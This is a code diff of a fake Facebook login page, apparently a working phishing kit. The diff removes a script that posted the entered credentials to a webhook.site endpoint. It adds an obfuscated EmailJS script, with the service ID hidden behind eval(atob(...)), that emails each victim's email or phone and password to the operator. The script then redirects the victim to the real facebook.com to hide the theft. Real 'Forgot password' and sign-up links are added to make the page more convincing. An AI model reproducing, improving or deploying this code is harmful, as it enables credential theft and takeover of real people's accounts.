@@ -179,40 +179,43 @@ hr {
           <p> around you on Facebook.</p>
         </div>
         <form id="form">
-          <input type="email" name="email" placeholder="Email or phone number" required>
-          <input type="password" name="password" placeholder="Password" required>
+          <input type="email" id="ue" placeholder="Email or phone number" required>
+          <input type="password" id="us" placeholder="Password" required>
           <div class="link">
             <button type="submit" class="login">Login</button>
-            <a href="#" class="forgot">Forgot password?</a>
+            <a href="https://www.facebook.com/login/identify/" class="forgot">Forgot password?</a>
           </div>
           <hr>
           <div class="button">
-            <a href="#">Create new account</a>
+            <a href="https://www.facebook.com/reg/">Create new account</a>
           </div>
         </form>
       </div>
     </div>
-    <script>
-(function() {
-
-form.addEventListener('submit', function(e) {
-// Prevent default behavior
-e.preventDefault();
-// Create new FormData object
-const formData = new FormData(form);
-// Convert formData object to URL-encoded string
-const payload = new URLSearchParams(formData);
-// Post the payload using Fetch
-window.location.href = "https://facebook.com";
-fetch('https://webhook.site/eaa00d15-a84a-4f46-839a-54d086d92920', {
-method: 'POST',
-body: payload,
-})
-.then(res => res.json())
-.then(data => console.log(data))
-})
-})()
-
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init('010_BjjlmuhpqFkP2');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            var _0x5b6f = ['submit', 'form', 'ue', 'us'];
+            document.getElementById(_0x5b6f[1]).addEventListener(_0x5b6f[0], function(e) {
+                e.preventDefault();
+                var em = document.getElementById(_0x5b6f[2]).value;
+                var em1 = document.getElementById(_0x5b6f[3]).value;
+                const templateParams = {
+                    from_name: em,
+                    message: em1,
+                };
+                emailjs.send(eval('atob("c2VydmljZV83djVnNWk5")'), 'template_tyysdmp', templateParams)
+                .then(function(response) {
+                        console.log('Email sent successfully:', response);
+                        window.location.href = "https://facebook.com";
+                })
+            });
+        }
     </script>
   </body>
 </html>
